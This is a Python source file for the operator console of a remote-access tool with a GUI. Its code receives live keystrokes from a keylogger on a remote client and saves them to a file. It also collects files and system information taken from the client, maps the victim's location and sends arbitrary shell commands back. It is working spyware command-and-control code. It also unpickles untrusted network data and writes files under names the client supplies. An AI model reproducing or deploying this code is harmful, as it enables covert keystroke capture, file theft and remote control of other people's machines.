from PIL import Image, ImageTk
import customtkinter
import tkinter
import threading
import socket
import tkintermapview
import subprocess
import time
import pickle
import os
from datetime import datetime
from tkinter import messagebox



class App(customtkinter.CTk):
    # Important lists
    SERVER_SOCKETS = []
    CLIENT_IP = []
    USER_GEOLOCATIONS = []

    # Socket IP adresses and PORTS
    filename_transfer_SOIP = "127.0.0.2"
    filename_transfer_SOPORT = 65433
    file_transfer_SOIP = "127.0.0.4"
    file_transfer_SOPORT = 1930
    cli_SOIP = "127.0.0.1"
    cli_SOPORT = 12345
    keylog_SOIP = "127.0.0.89"
    keylog_SOPORT = 65230
    gather_SOIP = "127.0.0.69"
    gather_SOPORT = 42069
    genSoc_SOIP = "127.0.0.1"
    genSoc_SOPORT = 46969

    # Important Variables
    sep = ":***:"
    stop_music = False


    def __init__(self):
        super().__init__()
               
        self.title("Anjel strazny")
        self.geometry("1000x490")

        # create 2x2 grid system
        self.grid_rowconfigure((0, 3), weight=1)
        self.grid_columnconfigure((0, 3), weight=1)
        ############################################################################################
        #                                        UI design                                         #
        ############################################################################################
        
        #! Backround image (red_forest)
        self.bg_image = customtkinter.CTkImage(light_image=Image.open("Data//mount.jpg"),
                                  dark_image=Image.open("Data//mount.jpg"),
                                  size=(300, 500))

        self.button = customtkinter.CTkButton(self, image=self.bg_image,
                                              border_width= 0,
                                              corner_radius=0,
                                              bg_color="blue",
                                              hover_color="black",
                                              fg_color="black",
                                              text=None,)
        self.button.grid(row=0, column=0, sticky="n")

        #! Right Frame: Live Keylogger update
        self.frame = customtkinter.CTkFrame(master=self,
                               width=200,
                               height=600)
        self.frame.grid(row=0, column=3, sticky="ne")


         # Text Box 
        self.textbox = customtkinter.CTkTextbox(master=self.frame, 
                                                width=160, 
                                                height=500,
                                                activate_scrollbars = False,
                                                corner_radius=0)
        self.textbox.grid(row=0, column=2)
        
        # create CTk scrollbar
        self.ctk_textbox_scrollbar = customtkinter.CTkScrollbar(self.frame,width=17, height=500, command=self.textbox.yview)
        self.ctk_textbox_scrollbar.grid(row=0, column=3,sticky="nw")
        
        # connect textbox scroll event to CTk scrollbar
        self.textbox.configure(yscrollcommand=self.ctk_textbox_scrollbar.set)
        
        
        #! Left Frame: Navigation Buttons
        self.frame1 = customtkinter.CTkFrame(master=self,
                               width=200,
                               height=500)
        self.frame1.grid(row=0, column=0,)
        

        # Buttons and the Logo
        self.my_image = customtkinter.CTkImage(light_image=Image.open("Data//new.png"),
                                  dark_image=Image.open("Data//new.png"),
                                  size=(120, 120))

        self.button = customtkinter.CTkButton(self.frame1, image=self.my_image,bg_color="black",hover_color="black",fg_color="black",text=None,)
        self.button.grid(row=0, column=0, pady =10,padx =10,sticky="n")

        self.button = customtkinter.CTkButton(master=self.frame1, 
                                            text="PLACEHOLDER",
                                            bg_color="dark blue", 
                                            fg_color="dark blue", 
                                            hover_color="white",
                                            text_color="black",
                                            )
        self.button.grid(row=1, column=0, pady =10,sticky="n", padx=10)

        self.button = customtkinter.CTkButton(master=self.frame1, 
                                            command=self.openMapLevel,
                                            fg_color="dark blue", 
                                            hover_color="white", text_color="black",
                                            text="Geolocation")
        self.button.grid(row=3, column=0, pady =10,sticky="n", padx=10)     

        self.button = customtkinter.CTkButton(master=self.frame1, 
                                            command=self.showFiles,
                                            fg_color="dark blue",
                                            hover_color="white", text_color="black",  
                                            text="Files")
        self.button.grid(row=4, column=0, pady =10, sticky="n", padx=10)

        self.button = customtkinter.CTkButton(master=self.frame1, 
                                             command=self.startGathering, 
                                             fg_color="dark blue",
                                             hover_color="white", text_color="black", 
                                             text="Show Client Info")
        self.button.grid(row=5,column=0,pady=10,sticky="n", padx=10)
        
        #! Center Frame: Main content/command line
        self.frame2 = customtkinter.CTkFrame(master=self,
                               width=500,
                               height=400,
                               corner_radius=0)
        self.frame2.grid(row=0, column=2, sticky="s")
        
        # BIG_Textbox, big_textbox, big
        self.m_textbox = customtkinter.CTkTextbox(self.frame2, width=565, height=400,corner_radius=0,)
        self.m_textbox.grid(row=1, column=1, sticky="n")

        self.entry = customtkinter.CTkEntry(master=self.frame2,
                               placeholder_text=" ",
                               width=320,
                               height=50,
                               border_width=2,
                               corner_radius=10)
        self.entry.grid(row=2, column=1, sticky="w", pady = 25, padx = 5)

        self.button = customtkinter.CTkButton(master=self.frame2,height=25,
                                              fg_color="dark blue",
                                              hover_color="black",  
                                              command=self.send_to_client,text="Submit")
        self.button.grid(row=2, column=1, padx = 10, pady = 10, sticky = "e")
                
        ###########################################################################################
        #                                        System                                           #
        ###########################################################################################  
        
        #! CLI SOCKET SEGMENT
        def start_CLI_socket():
            t3 = threading.Thread(target=create_CLI_socket)
            t3.daemon = True
            t3.start()
    
        def create_CLI_socket():
            global cli
            while True:
                # Recieve the clients IP PORT
                while True:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as Ip_info: # This will get the Clients IP and Port so that the CLI can connect
                            Ip_info.bind(("127.0.0.1", 44404))
                            Ip_info.listen(1)
                            conn, addr = Ip_info.accept()
                            while True: 
                                msg = conn.recv(128).decode("utf-8")
                                if msg:
                                    try:
                                        HOST = msg.split(";")[0]  
                                        PORT = int(msg.split(";")[1])
                                        self.m_textbox.insert("0.0", f"\nClient IP:{HOST}\nClient PORT:{PORT}\n")
                                        time.sleep(0.5)
                                        conn.send(bytes("continue", 'utf-8'))
                                        break
                                    except: print(f"Host: {HOST}\nPort: {PORT}")     
                    break  

                # Connect to the client
                while True:
                    try:    
                        cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        cli.connect((HOST,PORT))
                        print("CLI_Success: Connected to CLI client.")
                        self.m_textbox.insert("0.0", f"\nCLI connection succesfull\n")  
                        

                        ###################################################################
                        #! Start all the needed sockets once again as they have been closed
                        ###################################################################

                        
                        
                        if cli not in self.SERVER_SOCKETS:
                            self.SERVER_SOCKETS.append(cli) 
                        break
                    except Exception as e: print(f"Thrown Exception CLI: {e}")
                    time.sleep(3)

                # Checks if the client is still connected
                while True:
                    try: 
                        cli.send(bytes("TEST DATA", "utf-8")) 
                        time.sleep(10)
                    except Exception as e: 
                        if "[WinError 10056] A connect request was made on an already connected socket" in str(e): pass
                        else: 
                            self.m_textbox.insert("0.0", f"\nERROR: Client has disconnected!\n") 
                            print(f"CLI Reconnection error: {e}")
                            ###############################################################
                            #! After detecting a Client disconnect we MUST kill and renew ALL of our utility sockets like the keylogger otherwise the client wont be able to connect again
                            ###############################################################
                            break

        start_CLI_socket()    

        #? KEYLOGGER SOCKET
        def startSocket():
            print("\nServer started the keylog socket.")
            t2 = threading.Thread(target=createKeylogSocket)
            t2.daemon = True
            t2.start()

        def createKeylogSocket():
            HOST = self.keylog_SOIP
            PORT = self.keylog_SOPORT 
            global k_file
            with open("Keylogger_data.txt", "a") as k_file: # Create the Keylogger_data.txt file
                k_file.write(f"LOG: {str(datetime.now())}\n") # Insert the current time and date to the text file
                while True:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        # Continue
                        print("waiting for keylogger connection")
                        s.bind((HOST, PORT))
                        s.listen()
                        conn, addr = s.accept()
                        self.CLIENT_IP.append(addr)
                        self.m_textbox.insert("0.0", f"\nKeylogger operational.\n")  
                        with conn:
                            print(f"KEYLOGGER: Connected by {addr}")
                            self.USER_GEOLOCATIONS.append(conn.recv(64).decode("utf-8"))
                            self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
                            while True:
                                try: 
                                    # TODO: make a system that shortens the output when the backspace key is pressed
                                    data = conn.recv(1024).decode("utf-8") 
                                    self.textbox.insert("0.0", f"{data}\n")
                                    k_file.write(f"{data}\n")
                                except Exception as e:
                                    print("\nKeylogger connection lost.\n"); 
                                    time.sleep(2)
                                    break
        startSocket()
        
        #? FILE_TRANSFER SOCKET
        def start_file_name_socket():
            #print("\nDICT_TRANSFER: Server started.")
            t4 = threading.Thread(target=create_file_name_socket)
            t4.daemon = True
            t4.start()
            

        def create_file_name_socket():
            HOST = self.filename_transfer_SOIP  # Standard loopback interface address (localhost)
            PORT = self.filename_transfer_SOPORT  # Port to listen on (non-privileged ports are > 1023)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Add the server socket to a list
                self.SERVER_SOCKETS.append(s)
                # Continue
                s.bind((HOST, PORT))
                #print("DICT_TRANSFER: Listening for clients.\n")
                s.listen()
                conn, addr = s.accept()
                self.CLIENT_IP.append(addr)
                # Accept the pickle list and print it
                with conn:
                    #print(f"DICT_TRANSFER: Connected by {addr}")
                    data = conn.recv(1024)
                    data = pickle.loads(data)
                    #print(data)
      
        def start_file_transfer_socket():
            print("\nFILE_TRANSFER: Server started.")
            t5 = threading.Thread(target=create_file_transfer_socket)
            t5.daemon = True
            t5.start()
            
        def create_file_transfer_socket():
            HOST = self.file_transfer_SOIP
            PORT = self.file_transfer_SOPORT

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Create the Socket
                s.bind((HOST, PORT))
                s.listen()
                self.SERVER_SOCKETS.append(s)
                self.m_textbox.insert("0.0", f"\nFile Transfer online.\n")  
                while True:
                    conn, addr = s.accept()
                    while True:
                        try:
                            data = conn.recv(1024).decode("utf-8")
                            FILES = int(data)
                            conn.send("FILE_count_recv".encode("utf-8"))
                        except:
                            pass
                        for i in range(FILES):
                            try:
                                data = conn.recv(1024).decode("utf-8")
                                FILENAME = data
                                self.m_textbox.insert("0.0", f"File {FILENAME} is being recieved.\n") 
                                conn.send("Filename and filesize received".encode("utf-8"))
                                print(FILENAME)
                                file = open(f"Files/recv_{FILENAME}", "wb")
                                while True:
                                    data = conn.recv(1024)
                                    if b"**?END?**" in data: # ??????
                                        print("bend in data")
                                        file.close()
                                        break
                                    file.write(data)
                                    conn.send("Data received.".encode("utf-8"))
                            except:
                                file.close()
                                print("endeed")
                                self.m_textbox.insert("0.0", f"All files have been transfered.\n") 
                                break
                        break

        start_file_name_socket()
        start_file_transfer_socket()

                        
    ############################################################################################
    #                                        Functions                                         #
    ############################################################################################
    def send_to_client(self):
        global cli
        data = self.entry.get()
        try: cli.send(bytes(f"{data}", "utf-8"))
        except: pass
        print(f"Sent: {data}, to Client")
        self.m_textbox.insert("0.0", f"\nCLI Packet: {data}\n")  
            
    def showFiles(self):
        subprocess.Popen('explorer "Files"')         
    
    def openMapLevel(self):
        # create tkinter window
        def create_geoTopLevel():
            root_tk = customtkinter.CTkToplevel(self)
            root_tk.geometry("600x450")
            root_tk.title("Location mapping.")

            # create map widget
            map_widget = tkintermapview.TkinterMapView(root_tk, width=800, height=600, corner_radius=0)
            map_widget.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
            self.m_textbox.insert("0.0", f"\nGeolocation active.\n")  
            try:
                map_widget.set_address(f"{self.USER_GEOLOCATIONS}")
            except:
                map_widget.set_address("colosseo, rome, italy")
                self.m_textbox.insert("0.0", f"\nGeolocation module lacks coordinates. Default location will be used.\n")  

        geoThread = threading.Thread(target=create_geoTopLevel)
        geoThread.daemon = True
        geoThread.start()

    def startGathering(self):
        th = threading.Thread(target=self.Gathering)
        th.daemon=True
        th.start() 

    def Gathering(self):
        print("Starting1") 
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind((self.gather_SOIP, self.gather_SOPORT))
            window = customtkinter.CTkToplevel(self)
            window.geometry("400x400")
            our_box = customtkinter.CTkTextbox(window, 400, 400, text_color="white")
            our_box.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
            window.title("Client Info")
            our_box.insert(customtkinter.END, "veci")
            cli.send('run -gatherData'.encode("utf-8"))
            sock.listen()
            conn, _ = sock.accept()
            print("Accepted")
            infos = []
            while True:
                data = conn.recv(1024)
                infos.append(data.decode('utf-8'))
                if len(infos) > 3:
                    break
            for info in infos:
                # TODO: Format the output so that it clearly defines what data belongs to which system/property
                our_box.insert(customtkinter.END, f"{info}\n")

def on_closing():
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        k_file.close()
        app.destroy()

# Run dze up
app = App()
app.protocol("WM_DELETE_WINDOW", on_closing)
app.mainloop()
